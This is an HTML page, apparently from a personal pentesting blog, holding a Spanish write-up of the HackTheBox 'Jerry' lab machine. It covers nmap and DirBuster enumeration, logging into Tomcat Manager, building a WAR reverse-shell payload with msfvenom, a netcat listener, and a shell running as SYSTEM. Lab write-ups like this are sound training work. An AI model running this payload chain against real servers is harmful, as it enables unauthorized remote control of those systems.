@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>JERRY | HackTheBox | naow</title>
+
+    <link rel="stylesheet" href="../styles/main.css">
+
+    <style>
+        .writeup {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+
+        .writeup h1 {
+            margin-top: 0;
+        }
+
+        .writeup h2 {
+            margin-top: 35px;
+            color: #4CAF50;
+        }
+
+        .writeup p {
+            margin-bottom: 15px;
+        }
+
+        .writeup ul {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+
+        .writeup li {
+            margin-bottom: 8px;
+        }
+
+        .writeup pre {
+            background: #0a0a0a;
+            padding: 15px;
+            overflow-x: auto;
+            border-radius: 4px;
+            border: 1px solid #333;
+        }
+
+        .writeup code {
+            font-family: 'Courier New', monospace;
+        }
+
+        .writeup-image {
+            display: block;
+            max-width: 100%;
+            height: auto;
+            margin: 25px auto;
+            border-radius: 5px;
+            border: 1px solid #333;
+        }
+
+        .writeup a {
+            color: #4CAF50;
+        }
+
+        .warning {
+            border-left: 3px solid #4CAF50;
+            padding: 10px 15px;
+            margin: 20px 0;
+            background: #111;
+        }
+
+        .success {
+            border-left: 3px solid #4CAF50;
+            padding: 10px 15px;
+            margin: 20px 0;
+            background: #111;
+        }
+    </style>
+
+</head>
+
+<body>
+
+<header>
+
+    <h1>naow</h1>
+
+    <p>Pentester & Red Team</p>
+
+    <nav>
+        <a href="../index.html">Inicio</a>
+        <a href="../maquinas.html">Máquinas</a>
+        <a href="../about.html">Sobre Mí</a>
+    </nav>
+
+</header>
+
+
+<main>
+
+    <article class="writeup">
+
+        <p>
+            <a href="../maquinas.html">← Volver a Máquinas</a>
+        </p>
+
+
+        <h1>JERRY</h1>
+
+        <p class="date">
+            HackTheBox | Dificultad: Fácil
+        </p>
+
+
+        <!-- INTRODUCCIÓN -->
+
+        <h2>Introducción</h2>
+
+        <p>
+            JERRY es una máquina Windows de HackTheBox en la que el acceso
+            inicial se consigue mediante la explotación de un servidor
+            Apache Tomcat.
+        </p>
+
+        <p>
+            Comenzaremos realizando un reconocimiento de la máquina para
+            identificar los servicios expuestos. Tras encontrar el puerto
+            8080, identificaremos una instalación de Apache Tomcat 7.0.88.
+        </p>
+
+        <p>
+            Durante la enumeración web descubriremos el Tomcat Manager,
+            desde donde podremos desplegar archivos WAR. Aprovechando esta
+            funcionalidad generaremos un payload mediante <strong>msfvenom</strong>
+            y obtendremos una reverse shell.
+        </p>
+
+        <p>
+            Finalmente comprobaremos que el acceso obtenido se ejecuta
+            directamente con privilegios de <strong>NT AUTHORITY\SYSTEM</strong>.
+        </p>
+
+
+        <!-- 1 RECONOCIMIENTO -->
+
+        <h2>1. Reconocimiento</h2>
+
+        <p>
+            Antes de comenzar con la enumeración de puertos realizamos
+            un ping contra el objetivo para comprobar si responde y
+            obtener información sobre el sistema.
+        </p>
+
+        <pre><code>ping 10.129.136.9</code></pre>
+
+        <p>
+            La respuesta obtenida nos permite observar que el TTL es
+            compatible con un sistema Windows, por lo que continuamos
+            con la enumeración.
+        </p>
+
+        <img
+            src="../assets/images/jerry/01-pingparasabermaquinawindowsorlinux.png"
+            alt="Ping contra la máquina JERRY"
+            class="writeup-image"
+        >
+
+
+        <!-- 2 NMAP -->
+
+        <h2>2. Escaneo de puertos</h2>
+
+        <p>
+            Realizamos un escaneo completo de los puertos TCP para
+            identificar todos los servicios expuestos.
+        </p>
+
+        <pre><code>nmap -sS --min-rate 5000 -vvv -n -Pn 10.129.136.9 -oG allports</code></pre>
+
+        <p>
+            El escaneo revela un único puerto TCP abierto:
+        </p>
+
+        <ul>
+            <li><strong>8080/tcp</strong> → HTTP</li>
+        </ul>
+
+        <img
+            src="../assets/images/jerry/02-nmaprecon.png"
+            alt="Reconocimiento inicial de JERRY"
+            class="writeup-image"
+        >
+
+
+        <!-- 3 ENUMERACIÓN -->
+
+        <h2>3. Enumeración del servicio</h2>
+
+        <p>
+            Una vez identificado el puerto 8080, realizamos una
+            enumeración más específica utilizando detección de
+            versiones y scripts de Nmap.
+        </p>
+
+        <pre><code>nmap -p8080 -sCV 10.129.136.9 -oN targeted</code></pre>
+
+        <p>
+            El resultado identifica el servicio como:
+        </p>
+
+        <ul>
+            <li><strong>Apache Tomcat</strong></li>
+            <li><strong>Apache-Coyote/1.1</strong></li>
+            <li><strong>Tomcat 7.0.88</strong></li>
+        </ul>
+
+        <img
+            src="../assets/images/jerry/03-nmapSCVRECONVULNERA.png"
+            alt="Enumeración de Apache Tomcat"
+            class="writeup-image"
+        >
+
+
+        <!-- 4 WEB -->
+
+        <h2>4. Enumeración web</h2>
+
+        <p>
+            Accedemos al servicio web mediante el puerto 8080:
+        </p>
+
+        <pre><code>http://10.129.136.9:8080</code></pre>
+
+        <p>
+            Nos encontramos ante una instalación de Apache Tomcat.
+            Para ampliar la superficie de ataque realizamos una
+            enumeración de directorios.
+        </p>
+
+        <p>
+            Utilizamos DirBuster para buscar recursos y directorios
+            disponibles en la aplicación.
+        </p>
+
+        <img
+            src="../assets/images/jerry/05-dirbusterresultado.png"
+            alt="Resultado de DirBuster"
+            class="writeup-image"
+        >
+
+        <p>
+            Entre los recursos encontrados aparecen rutas relacionadas
+            con la administración de Tomcat, incluyendo el
+            <strong>Manager</strong>.
+        </p>
+
+
+        <!-- 5 TOMCAT -->
+
+        <h2>5. Tomcat Manager</h2>
+
+        <p>
+            Accedemos al Tomcat Manager desde la ruta correspondiente.
+        </p>
+
+        <p>
+            La aplicación solicita autenticación para acceder al panel
+            de administración.
+        </p>
+
+        <img
+            src="../assets/images/jerry/06-tomcatloginaqui.png"
+            alt="Login del Tomcat Manager"
+            class="writeup-image"
+        >
+
+        <p>
+            Al interactuar con el login conseguimos acceder a la
+            aplicación de administración.
+        </p>
+
+        <img
+            src="../assets/images/jerry/07-login.png"
+            alt="Acceso al Tomcat Manager"
+            class="writeup-image"
+        >
+
+
+        <!-- 6 CREDENTIALS -->
+
+        <h2>6. Identificación de las credenciales</h2>
+
+        <p>
+            Durante la enumeración del servicio encontramos información
+            relacionada con las credenciales utilizadas por Tomcat.
+        </p>
+
+        <p>
+            Al revisar la información disponible podemos identificar
+            las credenciales necesarias para acceder al Manager.
+        </p>
+
+        <img
+            src="../assets/images/jerry/08-aldarleeenelloginacancelarvemosquenosmuestralascredenciales.png"
+            alt="Credenciales mostradas por Tomcat"
+            class="writeup-image"
+        >
+
+        <p>
+            Con estas credenciales conseguimos autenticarnos correctamente
+            en el panel de administración.
+        </p>
+
+
+        <!-- 7 MANAGER -->
+
+        <h2>7. Identificación del vector de ataque</h2>
+
+        <p>
+            Una vez dentro del Tomcat Manager podemos observar las
+            aplicaciones desplegadas y diferentes opciones de
+            administración.
+        </p>
+
+        <p>
+            Entre ellas encontramos la funcionalidad que nos permite
+            realizar el <strong>Deploy de un archivo WAR</strong>.
+        </p>
+
+        <p>
+            Esta funcionalidad resulta especialmente interesante porque
+            nos permite ejecutar una aplicación que controlemos dentro
+            del servidor Tomcat.
+        </p>
+
+        <img
+            src="../assets/images/jerry/09-dentrodelloginvemoswardeployposibleexploit.png"
+            alt="Tomcat Manager con opción de desplegar WAR"
+            class="writeup-image"
+        >
+
+
+        <!-- 8 PAYLOAD -->
+
+        <h2>8. Generación del payload</h2>
+
+        <p>
+            Para aprovechar la funcionalidad de despliegue generamos
+            un archivo WAR que contiene un payload de reverse shell.
+        </p>
+
+        <p>
+            Utilizamos <strong>msfvenom</strong> para generar el archivo
+            especificando la dirección IP de nuestra máquina y el puerto
+            donde recibiremos la conexión.
+        </p>
+
+        <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.102 LPORT=4444 -f war -o shell.war</code></pre>
+
+        <p>
+            El resultado es un archivo WAR que posteriormente podremos
+            subir al Tomcat Manager.
+        </p>
+
+        <img
+            src="../assets/images/jerry/10-creamosconmsfvenomelexploitwarconlosdatos.png"
+            alt="Generación del payload WAR con msfvenom"
+            class="writeup-image"
+        >
+
+
+        <!-- 9 LISTENER -->
+
+        <h2>9. Preparación del listener</h2>
+
+        <p>
+            Antes de desplegar el WAR necesitamos preparar nuestra
+            máquina para recibir la conexión inversa.
+        </p>
+
+        <p>
+            Para ello ponemos un listener en el puerto 4444:
+        </p>
+
+        <pre><code>nc -lvnp 4444</code></pre>
+
+        <img
+            src="../assets/images/jerry/11-nosponemosenescucha.png"
+            alt="Listener preparado con Netcat"
+            class="writeup-image"
+        >
+
+
+        <!-- 10 DEPLOY -->
+
+        <h2>10. Despliegue del WAR</h2>
+
+        <p>
+            Volvemos al Tomcat Manager y utilizamos la sección
+            <strong>WAR file to deploy</strong> para subir el archivo
+            generado anteriormente.
+        </p>
+
+        <p>
+            Una vez seleccionado el archivo WAR, realizamos el deploy
+            de la aplicación.
+        </p>
+
+        <img
+            src="../assets/images/jerry/12-accionamoseldeployqueacabamosdesubir.png"
+            alt="Despliegue del archivo WAR"
+            class="writeup-image"
+        >
+
+
+        <!-- 11 SHELL -->
+
+        <h2>11. Obtención de la shell</h2>
+
+        <p>
+            Una vez desplegada la aplicación, accedemos a la ruta
+            correspondiente para ejecutar el payload.
+        </p>
+
+        <p>
+            Al ejecutarlo, el servidor establece una conexión inversa
+            con nuestra máquina.
+        </p>
+
+        <img
+            src="../assets/images/jerry/13-yunavezsubidoyatenemosaccesoalamaquina.png"
+            alt="Reverse shell obtenida"
+            class="writeup-image"
+        >
+
+
+        <!-- 12 SYSTEM -->
+
+        <h2>12. Obtención de SYSTEM</h2>
+
+        <p>
+            Una vez obtenida la shell comprobamos el usuario con el
+            que se está ejecutando el proceso:
+        </p>
+
+        <pre><code>whoami</code></pre>
+
+        <p>
+            El resultado es:
+        </p>
+
+        <pre><code>nt authority\system</code></pre>
+
+        <div class="success">
+            <strong>NT AUTHORITY\SYSTEM</strong><br>
+            Hemos obtenido acceso directamente con los máximos
+            privilegios del sistema.
+        </div>
+
+
+        <!-- CONCLUSIÓN -->
+
+        <h2>13. Conclusión</h2>
+
+        <p>
+            JERRY comienza con una sencilla fase de reconocimiento en
+            la que identificamos el puerto 8080 como único puerto TCP
+            expuesto.
+        </p>
+
+        <p>
+            La enumeración del servicio nos permite identificar
+            Apache Tomcat 7.0.88. Posteriormente descubrimos el
+            Tomcat Manager y conseguimos acceder utilizando las
+            credenciales disponibles.
+        </p>
+
+        <p>
+            Una vez dentro del Manager identificamos la funcionalidad
+            de despliegue de archivos WAR, que utilizamos como vector
+            de explotación.
+        </p>
+
+        <p>
+            Generamos un payload mediante <strong>msfvenom</strong>,
+            preparamos un listener con Netcat y desplegamos el WAR
+            mediante el Tomcat Manager.
+        </p>
+
+        <p>
+            Finalmente conseguimos una reverse shell sobre la máquina
+            Windows y comprobamos que el proceso se está ejecutando como
+            <strong>NT AUTHORITY\SYSTEM</strong>.
+        </p>
+
+        <p>
+            Por tanto, no es necesario realizar una fase adicional de
+            escalada de privilegios.
+        </p>
+
+        <p>
+            <strong>JERRY completada.</strong>
+        </p>
+
+    </article>
+
+</main>
+
+
+<footer>
+
+    <p>© 2026 naow</p>
+
+</footer>
+
+
+</body>
+</html>
